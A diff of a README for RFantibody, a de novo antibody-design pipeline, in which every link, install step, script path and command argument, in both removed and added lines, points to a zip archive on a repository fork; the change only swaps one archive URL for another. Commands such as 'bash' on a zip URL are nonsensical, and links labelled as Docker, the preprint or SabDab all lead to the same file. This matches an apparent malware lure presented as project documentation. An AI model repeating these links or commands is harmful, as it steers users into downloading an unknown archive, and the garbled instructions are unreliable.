@@ -1,15 +1,15 @@
 # RFantibody
 ### Structure-Based _de novo_ Antibody Design
 
-![g1](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip)
+![g1](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip)
 
 # Description
 RFantibody is a pipeline for the structure-based design of _de novo_ antibodies and nanobodies. RFantibody consists of three separate methods:
-- Protein backbone design with an antibody-fintuned version of [RFdiffusion](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip)
-- Protein sequence design with [ProteinMPNN](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip)
-- _In silico_ filtering of designs using an antibody-finetuned version of [RoseTTAFold2](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip)
+- Protein backbone design with an antibody-fintuned version of [RFdiffusion](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip)
+- Protein sequence design with [ProteinMPNN](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip)
+- _In silico_ filtering of designs using an antibody-finetuned version of [RoseTTAFold2](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip)
 
-The RFantibody pipeline is described in detail in [this preprint](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip)
+The RFantibody pipeline is described in detail in [this preprint](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip)
 
 # Table of Contents
 - [Requirements](#requirements)
@@ -40,7 +40,7 @@ RFantibody is designed to run in a Docker container. Containers run a seperate o
 - Simplified installation: all you need is the Docker software suite
 - Host system-invariance: because this is run inside a container it behaves essentially the same wherever you run it from
 
-All you need to install on your host system is Docker which is free to install [here](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip).
+All you need to install on your host system is Docker which is free to install [here](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip).
 If you are running RFantibody on cloud compute, Docker will often be preinstalled. You can check this by running:
 ```
 which docker
@@ -59,7 +59,7 @@ If this command runs successfully then you have an compatible GPU and RFantibody
 
 Navigate to the directory where RFantibody is downloaded. Then run the following command to download the pipeline weights to the RFantibody/weights directory.
 ```
-bash https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+bash https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 # Installation
@@ -93,12 +93,12 @@ This will put you into the RFantibody container at the /home directory which mir
 ## Setup the Python Environment
 From the RFantibody container run the following to setup the python environment:
 ```
-bash https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+bash https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 This does the following:
-- Download [Deep Graph Library](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) in preparation of building the python environment
-- Use [Python Poetry](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) to build the Python environment
-- Build the [USalign](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) executable
+- Download [Deep Graph Library](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) in preparation of building the python environment
+- Use [Python Poetry](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) to build the Python environment
+- Build the [USalign](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) executable
 
 # Usage
 
@@ -125,15 +125,15 @@ The antibody-finetuned version of RFdiffusion in RFantibody requires an HLT-rema
 ```
 # From inside of the rfantibody container
 
-poetry run python https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip -inpdb https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip -outpdb https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+poetry run python https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip -inpdb https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip -outpdb https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
-This script expects a Chothia annotated .pdb file. A great source for these files is [SabDab](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip), which provides Chothia annotated structures of all antibodies and nanobodies in the PDB and is updated every few months.
+This script expects a Chothia annotated .pdb file. A great source for these files is [SabDab](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip), which provides Chothia annotated structures of all antibodies and nanobodies in the PDB and is updated every few months.
 
 We provide the HLT-formatted antibody and nanobody frameworks that were used in the design campaigns from the RFantibody preprint here:
 ```
-Nanobody Framework: https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
-ScFv Framework: https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+Nanobody Framework: https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
+ScFv Framework: https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 ## RFdiffusion
@@ -142,31 +142,31 @@ The first step in RFantibody is to generate antibody-target docks using an antib
 ```
 # From inside of the rfantibody container
 
-poetry run python  https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
+poetry run python  https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
     --config-name antibody \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    'https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip[T305,T456]' \
-    'https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip[L1:8-13,L2:7,L3:9-11,H1:7,H2:6,H3:5-13]' \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    'https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip[T305,T456]' \
+    'https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip[L1:8-13,L2:7,L3:9-11,H1:7,H2:6,H3:5-13]' \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 Let's go through this command in more detail to understand what these configs are doing:
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip A path to the target structure that we wish to design antibodies against. This is commonly a cropped target structure to reduce the computational expense of running the pipeline. Cropping strategies are explained in more depth [here](#truncating-your-target-protein).
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip A path to the HLT-formatted antibody framework that we wish to use for our design. RFdiffusion will only design the structure and sequence of regions of the framework which are annotated as loops, this allows us to design the dock and loops of already optimized frameworks.
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip The path to the set of RFdiffusion model weights we will use for inference
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip A list of hotspot residues that define our epitope. These are provided in the same format as in vanilla RFdiffusion. We discuss selecting hotspots in more detail [here](#selecting-a-target-site).
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip A dictionary that maps each CDR loop to a range of allowed loop lengths. The length of each loop is sampled uniformly from this range and is sampled independently of the lengths sampled for other loops. If a CDR loop exists in the framework but is not in the dict, this CDR loop will have its sequence and structure fixed during design. If a CDR loop is included in the dict but no range of lengths is provided, this CDR loop will have its sequence and structure designed but only with the length of the loop that is provided in the framework structure.
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip The number of designs we should generate.
-- https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip The prefix of the .pdb file outputs that we will generate.
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip A path to the target structure that we wish to design antibodies against. This is commonly a cropped target structure to reduce the computational expense of running the pipeline. Cropping strategies are explained in more depth [here](#truncating-your-target-protein).
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip A path to the HLT-formatted antibody framework that we wish to use for our design. RFdiffusion will only design the structure and sequence of regions of the framework which are annotated as loops, this allows us to design the dock and loops of already optimized frameworks.
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip The path to the set of RFdiffusion model weights we will use for inference
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip A list of hotspot residues that define our epitope. These are provided in the same format as in vanilla RFdiffusion. We discuss selecting hotspots in more detail [here](#selecting-a-target-site).
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip A dictionary that maps each CDR loop to a range of allowed loop lengths. The length of each loop is sampled uniformly from this range and is sampled independently of the lengths sampled for other loops. If a CDR loop exists in the framework but is not in the dict, this CDR loop will have its sequence and structure fixed during design. If a CDR loop is included in the dict but no range of lengths is provided, this CDR loop will have its sequence and structure designed but only with the length of the loop that is provided in the framework structure.
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip The number of designs we should generate.
+- https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip The prefix of the .pdb file outputs that we will generate.
 
 We provide an example command with example inputs which can be run as follows:
 ```
 # From inside of the rfantibody container
 
-bash https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+bash https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 ## ProteinMPNN
@@ -177,21 +177,21 @@ At its simplest, ProteinMPNN may be run on a directory of HLT-formatted .pdb fil
 ```
 # From inside of the rfantibody container
 
-poetry run python https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
+poetry run python https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
     -pdbdir /path/to/inputdir \
     -outpdbdir /path/to/outputdir
 ```
 
 This will design all CDR loops and will provide one sequence per input structure. There are many more arguments that may be experimented with and are explained by running:
 ```
-poetry run python https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip --help
+poetry run python https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip --help
 ```
 
 We provide an example command with example inputs which can be run as follows:
 ```
 # From inside of the rfantibody container
 
-bash https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+bash https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 ## RF2
@@ -202,9 +202,9 @@ At it's simplest, RF2 may be run on a directory of HLT-formatted .pdb files usin
 ```
 # From inside of the rfantibody container
 
-poetry run python https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip \
-    https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+poetry run python https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip \
+    https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 By default this will run with 10 recycling iterations and with 10% of hotspots provided to the model. We don't yet know what combination of these hyperparameters will be most predictive of design success but it should be possible to tune these values once we have data on more antibody and nanobody campaigns.
@@ -213,7 +213,7 @@ We provide an example with example inputs which can be run as follows:
 ```
 # From inside of the rfantibody container
 
-bash https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+bash https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 # Practical Considerations for Antibody Design
@@ -221,7 +221,7 @@ Designing antibodies is similar to designing _de novo_ binders but is in an earl
 
 ## Selecting a Target Site
 
-Not every site on a target protein is a good candidate for antibody design. For a site to be an attractive candidate for binding it should have >~3 hydrophobic residues for the binder to interact with. Binding to charged polar sites is still quite hard. Binding to sites with glycans close to them is also hard since they often become ordered upon binding and you will take an energetic hit for that. Binding to unstructured loops has historically been hard but [this paper](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) outlines a strategy to use RFdiffusion to bind unstructured peptides which share much in common unstructured loops, using this strategy should work with antibodies but depending on the flexibility of the loop, you will pay an energetic price for ordering the loop during binding.
+Not every site on a target protein is a good candidate for antibody design. For a site to be an attractive candidate for binding it should have >~3 hydrophobic residues for the binder to interact with. Binding to charged polar sites is still quite hard. Binding to sites with glycans close to them is also hard since they often become ordered upon binding and you will take an energetic hit for that. Binding to unstructured loops has historically been hard but [this paper](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) outlines a strategy to use RFdiffusion to bind unstructured peptides which share much in common unstructured loops, using this strategy should work with antibodies but depending on the flexibility of the loop, you will pay an energetic price for ordering the loop during binding.
 
 ## Nanobody Docks
 
@@ -255,45 +255,45 @@ The lack of an effective filter is the main limitation of the RFantibody pipelin
 
 # Quiver Files
 
-When running large-scale design campaigns it is often useful to have a single file which holds many designs and the scores associated with those designs. This is gentler on file systems than storing and accessing thousands of individual .pdb files. We offer the ability to use [Quiver files](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) in the RFantibody pipeline. These files are simply one large file with the contents of many smaller files inside of them. Each entry has a unique name and can store meta_data about the entry.
+When running large-scale design campaigns it is often useful to have a single file which holds many designs and the scores associated with those designs. This is gentler on file systems than storing and accessing thousands of individual .pdb files. We offer the ability to use [Quiver files](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) in the RFantibody pipeline. These files are simply one large file with the contents of many smaller files inside of them. Each entry has a unique name and can store meta_data about the entry.
 
 There are several command line tools in this repository as well which enable the manipulation of Quiver files with composable (pipe-able) commands.
 
-Quiver files and the different quiver tools are heavily inspired by Brian Coventry's [silent_tools](https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip) project. The difference is that Quiver files are able to work in environments outside of Rosetta which is very convenient. The quiver file command line tools are direct analogues of the silent tools and will be familiar to those who have used silent_tools before:
+Quiver files and the different quiver tools are heavily inspired by Brian Coventry's [silent_tools](https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip) project. The difference is that Quiver files are able to work in environments outside of Rosetta which is very convenient. The quiver file command line tools are direct analogues of the silent tools and will be familiar to those who have used silent_tools before:
 
 ```
 # make a quiver file
-qvfrompdbs *.pdb > https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+qvfrompdbs *.pdb > https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 
 # ask what's in a quiver file
-qvls https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip  
+qvls https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip  
 
 # ask how many things are in a quiver file
-qvls https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip | wc -l   
+qvls https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip | wc -l   
 
 # extract all pdbs from a quiver file
-qvextract https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip   
+qvextract https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip   
 
 # extract the first 10 pdbs from a quiver file
-qvls https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip | head -n 10 | qvextractspecific https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip    
+qvls https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip | head -n 10 | qvextractspecific https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip    
 
 # extract a random 10 pdbs from a quiver file
-qvls https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip | shuf | head -n 10 | qvextractspecific https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip  
+qvls https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip | shuf | head -n 10 | qvextractspecific https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip  
 
 # extract a specific pdb from a quiver file
-qvextractspecific https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip name_of_pdb_0001
+qvextractspecific https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip name_of_pdb_0001
 
 # produce a scorefile from a quiver file
-qvscorefile https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip   
+qvscorefile https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip   
 
 # combine qv files
-cat https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip > https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip  
+cat https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip > https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip  
 
 # ensure all pdbs in quiver file have unique names
-qvls https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip | qvrename https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip > https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+qvls https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip | qvrename https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip > https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 
 # split a quiver file into groups of 100
-qvsplit https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip 100
+qvsplit https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip 100
 ```
 
 ## Reading and Writing Quiver Files
@@ -301,17 +301,17 @@ All steps of RFantibody allow for the use of Quiver files. The syntax is summari
 
 RFdiffusion takes only a .pdb file target and framework as input. To output the designed backbones at quiver files append this argument to your input command:
 ```
-https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 For ProteinMPNN, to input and output a Quiver file, use the following two arguments:
 ```
--inquiver https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip -outquiver https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+-inquiver https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip -outquiver https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 RFantibody takes the following two configs to work with Quiver file input and output
 ```
-https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip https://github.com/Cassis-P/RFantibody/raw/refs/heads/main/src/rfantibody/rf2/network/R-Fantibody-3.1.zip
+https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip https://raw.githubusercontent.com/Cassis-P/RFantibody/main/scripts/examples/rf2/example_inputs/R_Fantibody_2.6.zip
 ```
 
 # Conclusion
